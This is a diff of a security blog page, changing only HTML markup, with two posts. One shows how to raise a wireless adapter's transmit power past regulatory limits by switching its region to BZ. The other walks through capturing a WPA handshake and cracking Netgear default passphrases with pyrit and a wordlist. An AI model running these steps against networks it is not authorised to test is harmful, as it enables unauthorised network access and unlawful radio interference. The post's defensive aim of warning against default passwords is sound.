@@ -17,7 +17,7 @@
 <h3><a class="ablack" href="increasing-the-power-output-of-your-alfa-awus036h.html">
 Increasing the Power Output of your Alfa AWUS036H
 </a></h3>
-<!-- bashblog_timestamp: #201607011100.49# -->
+<!-- bashblog_timestamp: #201607011511.09# -->
 <div class="subtitle">July 01, 2016 &mdash; 
 metalkey
 </div>
@@ -33,14 +33,14 @@ Information on how this value is determined is explained in-depth at Linux Wirel
 <code></p>
 
 <div class="code">
-<font color="silver">root@kali:~$</font> <b>iwconfig</b><br>
-<font color="silver"><br>
+root@kali:~$ <com>iwconfig</com><br>
+<br>
 wlan0 IEEE 802.11bg ESSID:off/any<br>
-Mode:Managed Access Point: Not-Associated <b>Tx-Power=20 dBm</b><br>
+Mode:Managed Access Point: Not-Associated <com>Tx-Power=20 dBm</com><br>
 Retry short limit:7 RTS thr:off Fragment thr:off<br>
 Encryption key:off<br>
 Power Management:off<br>
-</font>
+
 </div>
 
 <p></code></p>
@@ -51,18 +51,18 @@ Power Management:off<br>
 <code></p>
 
 <div class="code">
-<font color="silver">root@kali:~$</font> <b>ifconfig wlan0 down</b><br>
-<font color="silver">root@kali:~$</font> <b>iw reg set BZ</b><br>
-<font color="silver">root@kali:~$</font> <b>iwconfig wlan0 txpower 30</b><br>
-<font color="silver">root@kali:~$</font> <b>ifconfig wlan0 up</b><br>
-<font color="silver">root@kali:~$</font> <b>iwconfig</b><br>
-<font color="silver"><br>
+root@kali:~$ <com>ifconfig wlan0 down</com><br>
+root@kali:~$ <com>iw reg set BZ</com><br>
+root@kali:~$ <com>iwconfig wlan0 txpower 30</com><br>
+root@kali:~$ <com>ifconfig wlan0 up</com><br>
+root@kali:~$ <com>iwconfig</com><br>
+<br>
 wlan0 IEEE 802.11bg ESSID:off/any<br>
-Mode:Managed Access Point: Not-Associated <b>Tx-Power=30 dBm</b><br>
+Mode:Managed Access Point: Not-Associated <com>Tx-Power=30 dBm</com><br>
 Retry short limit:7 RTS thr:off Fragment thr:off<br>
 Encryption key:off<br>
 Power Management:off<br>
-</font>
+
 </div>
 
 <p></code>
@@ -74,8 +74,8 @@ Higher values can also be set and detailed instructions are available at Null By
 <h3><a class="ablack" href="netgear-wireless-router-default-passphrase-vulnerability.html">
 Netgear Wireless Router Default Passphrase Vulnerability
 </a></h3>
-<!-- bashblog_timestamp: #201606302320.21# -->
-<div class="subtitle">June 30, 2016 &mdash; 
+<!-- bashblog_timestamp: #201607011502.09# -->
+<div class="subtitle">July 01, 2016 &mdash; 
 metalkey
 </div>
 <!-- text begin -->
@@ -93,8 +93,8 @@ metalkey
 <code></p>
 
 <div class="code">
-<font color="silver">user@debian8:~$</font> <b>sudo apt-get install aircrack-ng</b><br>
-<font color="silver">user@debian8:~$</font> <b>sudo apt-get install pyrit</b>
+user@debian8:~$ <com>sudo apt-get install aircrack-ng</com><br>
+user@debian8:~$ <com>sudo apt-get install pyrit</com>
 </div>
 
 <p></code></p>
@@ -106,9 +106,9 @@ Tutorial @ SecurityTube - <a href="http://www.securitytube.net/groups?operation=
 <code></p>
 
 <div class="code">
-<font color="silver">user@debian8:~$</font> <b>airmon-ng start wlan0</b><br>
-<font color="silver">user@debian8:~$</font> <b>airodump-ng mon0</b><br>
-<font color="silver">user@debian8:~$</font> <b>airodump-ng -c 1 -w netgear.cap --bssid 00:11:22:33:44:55 mon0</b><br>
+user@debian8:~$ <com>airmon-ng start wlan0</com><br>
+user@debian8:~$ <com>airodump-ng mon0</com><br>
+user@debian8:~$ <com>airodump-ng -c 1 -w netgear.cap --bssid 00:11:22:33:44:55 mon0</com><br>
 </div>
 
 <p></code></p>
@@ -119,14 +119,14 @@ Tutorial @ SecurityTube - <a href="http://www.securitytube.net/groups?operation=
 <code></p>
 
 <div class="code">
-<font color="silver">user@debian8:~$</font> <b>pyrit -r netgear.cap analyze</b><br>
-<font color="silver">user@debian8:~$</font> <b>pyrit -r netgear.cap -o stripped-netgear.cap strip</b><br>
-<font color="silver">user@debian8:~$</font> <b>pyrit -r stripped-netgear.cap -i adjective_noun_3d.txt -b 00:11:22:33:44:55 attack_passthrough</b><br>
-<font color="silver">...</font><br>
-<font color="silver">Parsing file 'stripped-netgear.cap' (1/1)...</font><br>
-<font color="silver">Parsed 10 packets (10 802.11-packets), got 1 AP(s)</font><br>
-<font color="silver">Tried 12235614 PMKs so far; 25683 PMKs per second.</font><br>
-<font color="silver">The password is</font> <b>'magicalsquash835'</b><br>
+user@debian8:~$ <com>pyrit -r netgear.cap analyze</com><br>
+user@debian8:~$ <com>pyrit -r netgear.cap -o stripped-netgear.cap strip</com><br>
+user@debian8:~$ <com>pyrit -r stripped-netgear.cap -i adjective_noun_3d.txt -b 00:11:22:33:44:55 attack_passthrough</com><br>
+...<br>
+Parsing file 'stripped-netgear.cap' (1/1)...<br>
+Parsed 10 packets (10 802.11-packets), got 1 AP(s)<br>
+Tried 12235614 PMKs so far; 25683 PMKs per second.<br>
+The password is <com>'magicalsquash835'</com><br>
 </div>
 
 <p></code></p>
@@ -136,9 +136,6 @@ Tutorial @ SecurityTube - <a href="http://www.securitytube.net/groups?operation=
 <p>Never use the default passphrase provided with your router and always use complex passwords that do not follow predictable patterns.</p>
 
 <p>Tags: <a href='tag_wifi.html'>wifi</a></p>
-
-
-
 <!-- text end -->
 </div>
 <div id="footer">CC by-nc-nd <a href="https://twitter.com/m3t4lk3y">metalkey</a> &mdash; <a href="mailto:"></a><br/>
